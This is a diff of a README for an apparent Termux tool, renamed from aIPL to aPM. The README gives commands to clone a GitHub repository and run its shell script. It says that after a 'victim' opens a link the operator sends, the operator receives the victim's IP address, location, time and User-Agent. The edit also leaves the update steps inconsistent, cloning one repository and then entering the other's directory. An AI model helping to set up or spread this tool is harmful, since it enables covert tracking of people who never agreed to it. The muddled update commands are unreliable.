@@ -8,10 +8,10 @@ Run these commands:
 - `pkg update`
 - `pkg install git`
 - `pkg install php`
-- `git clone https://github.com/aSk-p/aIPL`
-- `cd aIPL`
+- `git clone https://github.com/adxnisrbx/aPM`
+- `cd aPM`
 - `chmod +x *`
-- `bash aIPL.sh`
+- `bash aPM.sh`
 
 after the victim opens the link you sent, you will get the IP Adress, location, current time and User-Agent of the victim
 
@@ -19,10 +19,10 @@ after the victim opens the link you sent, you will get the IP Adress, location, 
 Check this repository regularly, to check if it got updated.
 
 If it got updated, run the following commands:
-- `rm -rf aIPL`
+- `rm -rf aPM`
 - `git clone https://github.com/aSk-p/aIPL`
-- `cd aIPL`
-- `bash aIPL.sh`
+- `cd aPM`
+- `bash aPM.sh`
 
 After that it should work fine!
 
